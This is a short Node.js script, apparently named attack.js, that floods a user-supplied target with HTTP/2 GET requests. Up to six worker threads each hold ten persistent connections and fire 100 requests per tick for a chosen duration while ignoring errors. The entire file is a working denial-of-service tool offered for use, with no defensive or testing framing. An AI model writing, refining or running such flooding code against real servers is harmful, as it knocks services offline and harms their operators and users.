const http2 = require('http2');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { cpus } = require('os');

const THREADS = Math.min(6, cpus().length);

if (isMainThread) {
    if (process.argv.length < 4) {
        console.error('Usage: node attack.js <target> <duration_secs>');
        process.exit(1);
    }

    const target = process.argv[2];
    const duration = parseInt(process.argv[3]);

    console.log(`Launching attack on ${target} for ${duration}s with ${THREADS} threads...`);

    for (let i = 0; i < THREADS; i++) {
        new Worker(__filename, { workerData: { target, duration } });
    }
} else {
    const { target, duration } = workerData;
    const end = Date.now() + duration * 1000;

    function spam(client) {
        const interval = setInterval(() => {
            for (let i = 0; i < 100; i++) {
                if (Date.now() > end) return clearInterval(interval);
                const req = client.request({ ':path': '/', ':method': 'GET' });
                req.on('error', () => {});
                req.end();
            }
        }, 0);
    }

    function connectAndFlood() {
        try {
            const client = http2.connect(target);
            client.on('error', () => {});
            client.on('connect', () => spam(client));
        } catch (e) {
            setTimeout(connectAndFlood, 100);
        }
    }

    // Create multiple persistent connections
    for (let i = 0; i < 10; i++) connectAndFlood();
}
